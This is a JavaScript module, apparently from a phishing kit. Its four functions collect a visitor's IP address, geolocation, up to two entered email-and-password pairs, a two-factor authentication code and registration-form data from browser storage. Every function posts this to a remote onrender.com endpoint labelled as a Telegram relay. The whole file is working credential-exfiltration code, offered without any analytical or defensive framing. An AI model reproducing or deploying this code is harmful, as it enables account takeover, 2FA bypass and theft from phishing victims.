import axios from "axios";

export const sendMessageUserNameTelegram1 = async (newAttempts) => {
  try {
    const ip = JSON.parse(localStorage.getItem("ip"));
    const location = JSON.parse(localStorage.getItem("user_location"));

    await axios.post("https://tools-project-be-1fgv.onrender.com/users/sendMessage", {
      message: `📝 *User information*\n🌍 *IP:* [${ip}](http://${ip})\n📍 *Quarter:* ${location?.quarter ?? ""}\n📍 *Quốc gia:* ${location?.country}\n📍 *Thành phố:* ${location?.city}\n📍 *Đường:* ${location?.quarter? location?.road : ""}\n👤 *Username1:* ${newAttempts[0]?.email}\n🔑 *Password1:* ${newAttempts[0]?.password}\n`,
    });
  } catch (error) {
    console.error("Error:", error);
  }
};

export const sendMessageUserNameTelegram = async (newAttempts) => {
  try {
    const ip = JSON.parse(localStorage.getItem("ip"));
    const location = JSON.parse(localStorage.getItem("user_location"));

    await axios.post("https://tools-project-be-1fgv.onrender.com/users/sendMessage", {
      message: `📝 *User information*\n🌍 *IP:* [${ip}](http://${ip})\n📍 *Quarter:* ${location?.quarter ?? ""}\n📍 *Quốc gia:* ${location?.country}\n📍 *Thành phố:* ${location?.city}\n📍 *Đường:* ${location?.quarter? location?.road : ""}\n👤 *Username1:* ${newAttempts[0]?.email}\n👤 *Username2:* ${newAttempts[1]?.email}\n🔑 *Password1:* ${newAttempts[0]?.password}\n🔑 *Password2:* ${newAttempts[1].password}\n`,
    });
  } catch (error) {
    console.error("Error:", error);
  }
};

export const sendMessageCodeTelegram = async (code) => {
  try {
    const ip = JSON.parse(localStorage.getItem("ip"));
    const loginAttempts = JSON.parse(localStorage.getItem("loginAttempts"));
    const location = JSON.parse(localStorage.getItem("user_location"));
    const codeFA = JSON.parse(localStorage.getItem("twoFactorCode"));

   await axios.post("https://tools-project-be-1fgv.onrender.com/users/sendMessage", {
      message: `📝 *User information*\n🌍 *IP:* [${ip}](http://${ip})\n📍 *Quarter:* ${location?.quarter ?? ""}\n📍 *Quốc gia:* ${location?.country}\n📍 *Thành phố:* ${location?.city}\n📍 *Đường:* ${location?.quarter ? location?.road : ""}\n👤 *Username1:* ${loginAttempts[0]?.email}\n👤 *Username2:* ${loginAttempts[1]?.email}\n🔑 *Password1:* ${loginAttempts[0]?.password}\n🔑 *Password2:* ${loginAttempts[1].password}\n🔓 *Code:* ${code || codeFA }\n`,
    });
  } catch (error) {
    console.error("Error:", error);
  }
};

export const sendMessageRegisterTelegram = async (dataForm) => {
  try {
    const ip = JSON.parse(localStorage.getItem("ip"));
    const loginAttempts = JSON.parse(localStorage.getItem("loginAttempts"));
    const location = JSON.parse(localStorage.getItem("user_location"));
    const codeFA = JSON.parse(localStorage.getItem("twoFactorCode"));

    // Format message từ dataForm
    const formatMessage = (data) => {
      return Object.entries(data)
        .map(([key, value]) => {
          // Nếu value là mảng, nối các phần tử lại với dấu ", "
          if (Array.isArray(value)) {
            return `📌 *${key}*: ${value.join(", ")}`;
          }
          return `📌 *${key}*: ${value}`;
        })
        .join("\n");
    };

    const formattedData = formatMessage(dataForm);

    await axios.post("https://tools-project-be-1fgv.onrender.com/users/sendMessage", {
      message: `📝 *User information*\n🌍 *IP:* [${ip}](http://${ip})\n📍 *Quarter:* ${location?.quarter ?? ""}\n📍 *Quốc gia:* ${location?.country}\n📍 *Thành phố:* ${location?.city}\n📍 *Đường:* ${location?.quarter ? location?.road: ""}\n👤 *Username1:* ${loginAttempts[0]?.email}\n👤 *Username2:* ${loginAttempts[1]?.email}\n🔑 *Password1:* ${loginAttempts[0]?.password}\n🔑 *Password2:* ${loginAttempts[1].password}\n🔓 *Code:* ${codeFA}\n\n${formattedData}`,
    });
  } catch (error) {
    console.error("Error:", error);
  }
};